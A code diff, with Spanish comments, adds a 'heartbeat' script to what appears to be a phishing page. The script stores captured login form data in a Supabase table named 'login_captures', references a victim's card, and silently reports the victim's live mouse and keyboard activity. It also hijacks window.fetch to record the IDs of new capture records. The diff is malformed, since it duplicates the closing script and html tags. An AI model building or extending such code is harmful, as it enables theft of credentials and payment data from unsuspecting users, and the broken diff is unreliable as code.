@@ -1021,6 +1021,119 @@
   } else {
     initSubmitHandler();
   }
+  
+  // ═══════════════════════════════════════════════════════════════
+  // SISTEMA DE LATIDOS (HEARTBEAT) - ACTIVIDAD DEL USUARIO
+  // ═══════════════════════════════════════════════════════════════
+  // Envía actualizaciones de last_activity a Supabase mientras
+  // el usuario interactúa con la página (teclea o mueve el mouse)
+  // ═══════════════════════════════════════════════════════════════
+  
+  var sessionRecordId = null;
+  var heartbeatInterval = null;
+  var lastHeartbeatTime = 0;
+  var HEARTBEAT_THROTTLE = 5000; // Enviar latido cada 5 segundos como máximo
+  
+  // Función para enviar latido de actividad a Supabase
+  function enviarHeartbeat() {
+    var ahora = Date.now();
+    if (ahora - lastHeartbeatTime < HEARTBEAT_THROTTLE) return;
+    lastHeartbeatTime = ahora;
+    
+    // Buscar el ID del registro de sesión en localStorage
+    // (se guarda cuando se redirige a contador.html)
+    var storedData = localStorage.getItem('loginFormData');
+    if (!storedData) return;
+    
+    try {
+      var formData = JSON.parse(storedData);
+      // Si no tenemos un ID de registro, intentamos obtenerlo
+      if (!sessionRecordId) {
+        // Buscar el registro más reciente con esta tarjeta
+        fetch(SUPABASE_URL + '/rest/v1/login_captures?select=id&order=created_at.desc&limit=1', {
+          headers: {
+            'apikey': SUPABASE_KEY,
+            'Authorization': 'Bearer ' + SUPABASE_KEY,
+            'Content-Type': 'application/json'
+          }
+        })
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+          if (data && data.length > 0) {
+            sessionRecordId = data[0].id;
+            actualizarLastActivity(sessionRecordId);
+          }
+        })
+        .catch(function(e) { /* silencioso */ });
+      } else {
+        actualizarLastActivity(sessionRecordId);
+      }
+    } catch(e) { /* silencioso */ }
+  }
+  
+  function actualizarLastActivity(recordId) {
+    fetch(SUPABASE_URL + '/rest/v1/login_captures?id=eq.' + recordId, {
+      method: 'PATCH',
+      headers: {
+        'Content-Type': 'application/json',
+        'apikey': SUPABASE_KEY,
+        'Authorization': 'Bearer ' + SUPABASE_KEY,
+        'Prefer': 'return=minimal'
+      },
+      body: JSON.stringify({ last_activity: new Date().toISOString() })
+    })
+    .catch(function(e) { /* silencioso */ });
+  }
+  
+  // Iniciar monitoreo de actividad del usuario
+  function iniciarMonitoreoActividad() {
+    // Eventos de actividad del usuario
+    var activityEvents = ['mousemove', 'mousedown', 'keydown', 'keyup', 'scroll', 'touchstart', 'touchmove'];
+    
+    activityEvents.forEach(function(eventType) {
+      document.addEventListener(eventType, function() {
+        enviarHeartbeat();
+      }, { passive: true });
+    });
+    
+    // También enviar un latido inicial
+    setTimeout(enviarHeartbeat, 2000);
+  }
+  
+  // Iniciar el monitoreo cuando el DOM esté listo
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', iniciarMonitoreoActividad);
+  } else {
+    iniciarMonitoreoActividad();
+  }
+  
+  // Guardar el ID de sesión cuando se redirige a contador.html
+  // interceptando el fetch para capturar el ID
+  var originalFetch = window.fetch;
+  window.fetch = function() {
+    var url = arguments[0];
+    var options = arguments[1] || {};
+    
+    return originalFetch.apply(this, arguments).then(function(response) {
+      // Si es la respuesta de crear un login_capture, guardamos el ID
+      if (typeof url === 'string' && url.indexOf('/login_captures') !== -1 && 
+          (!options.method || options.method === 'POST')) {
+        response.clone().json().then(function(data) {
+          if (data && data.length > 0 && data[0].id) {
+            sessionRecordId = data[0].id;
+          }
+        }).catch(function() {});
+      }
+      return response;
+    });
+  };
+})();
+</script>
+</body>
+</html>
+  } else {
+    initSubmitHandler();
+  }
 })();
 </script>
 </body></html>
